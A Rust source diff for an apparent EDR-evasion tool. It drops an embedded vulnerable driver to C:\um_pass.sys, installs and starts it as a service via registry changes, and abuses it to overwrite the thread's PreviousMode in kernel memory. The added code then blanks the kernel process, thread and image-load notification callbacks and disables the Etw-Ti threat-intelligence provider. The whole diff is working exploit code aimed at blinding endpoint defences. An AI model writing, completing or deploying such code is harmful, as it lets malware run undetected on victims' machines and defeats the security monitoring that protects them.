@@ -2,6 +2,7 @@ use std::{thread, time};
 use std::ffi::{c_void};
 
 mod utils;
+mod svc;
 mod pdb_utils;
 mod km_utils;
 mod xp_utils;
@@ -14,7 +15,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[*] Waiting for the opportune moment...\n");
     let bo_do_bleep = time::Duration::from_millis(100);
     thread::sleep(bo_do_bleep);
-
 
     // -=-= Doing setup =-=- //
 
@@ -79,7 +79,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
     match km_utils::get_driver_base("fltmgr.sys") {
         Some(base) => {
-            println!("[+] FltMgr.sys base address: {:?}", base);
+            println!("[+] FM base address: {:?}", base);
             fm_base = base;
         },
         None => {
@@ -105,36 +105,35 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("[-] No suspicious EDR DLLs found in process {}", target_pid);
     }
     */
-    
+    svc::write_embedded_file("C:\\um_pass.sys")?;
     
     // Get a handle to the vuln driver
     let h_drv;
+    match xp_utils::get_driver_handle() {
+        Ok(_handle) => { }
+        Err(err) => {
+            eprintln!("[-] Could not get handle, error: {}. Need to download...", err);
+            let svc_name = "umpass";
+            let bin_path = r"\\??\\C:\\um_pass.sys"; // escaped backslashes
+            svc::write_embedded_file("C:\\um_pass.sys")?;
+            // Try modifying the registry first
+            svc::modify_svc_reg(svc_name, bin_path)
+                .expect("[!] Failed to modify service registry");
+            // If registry modification succeeds, start the service
+            svc::start_svc(svc_name)
+                .expect("[!] Failed to start service");
+        }
+    }
     match xp_utils::get_driver_handle() {
         Ok(handle) => {
             h_drv = handle;
         }
         Err(err) => {
-            eprintln!("[-] Could not get handle, error: {}", err);
+            eprintln!("[-] Could not get handle, error: {}. Did not start service...exiting.", err);
             std::process::exit(-1);
         }
     }
     println!("[+] Got driver handle: {:?}", h_drv);
-
-    // Remove Process Creation Notification callback
-    let process_create_notify_base = {
-        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
-    };
-    println!("[>] PspCreateProcessNotifyRoutine is at: 0x{:16x}", process_create_notify_base);
-
-    println!("[*] Sending exploit to remove process creation notification.");
-    unsafe {
-        xp_utils::send_ioctl_to_driver(
-            h_drv, 
-            process_create_notify_base + 0x20,
-            0x8
-        );
-    }
-
 
     // Get KTHREAD and then KTHREAD.PreviousMode
     let thread_addr: Option<*mut c_void> = km_utils::get_thread_info();
@@ -142,7 +141,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     if let Some(ptr) = thread_addr {
         let addr = ptr as usize;
-        pm = Some((addr + 0x232) as *mut u8);
+        let pm_offset = nt_offsets.modus_previosa as usize;
+        pm = Some((addr + pm_offset) as *mut u8);
 
         println!("[*] Thread pointer: {:p}", ptr);
         println!("[+] Pointer to modus previosa of our thread: {:p}", pm.unwrap());
@@ -160,12 +160,50 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         );
     }
 
-
+    // =-=-> Remove Process Creation Notification callback
+    println!("[>] Removing notification callbacks:");
+    let process_create_notify_base = {
+        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
+    };
+    let thread_create_notify_base = {
+        (nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)
+    };
+    let img_load_notify_base = {
+        (nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)
+    };
     
-    let cb_read = xp_utils::read_cb(
+    match xp_utils::nerf_cb(
         process_create_notify_base, 
         "PspCreateProcessNotifyRoutine"
-    );
+    ) {
+        Ok(_val) => {},
+        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
+    }
+    match xp_utils::nerf_cb(thread_create_notify_base, "PspCreateThreadNotifyRoutine") {
+        Ok(_val) => {},
+        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
+    }
+    match xp_utils::nerf_cb(img_load_notify_base, "PspLoadImageNotifyRoutine") {
+        Ok(_val) => {},
+        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
+    }
+
+
+    // =-=-> Disable Etw-Ti provider
+    let ti_handle = {
+        (nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)
+    };
+    match xp_utils::nerf_etw_prov(
+        ti_handle, 
+        "Etw-Ti", 
+        nt_offsets.guid_entry, 
+        nt_offsets.prov_enable_info) 
+        {
+        Ok(val) => println!("[|] Provider completed: 0x{:X}", val),
+        Err(e) => eprintln!("[-] Failed to read: {:?}", e),
+    }
+
+
 
 
     // Clean up: Write 0x1 back to PM. Can't read it again! :D
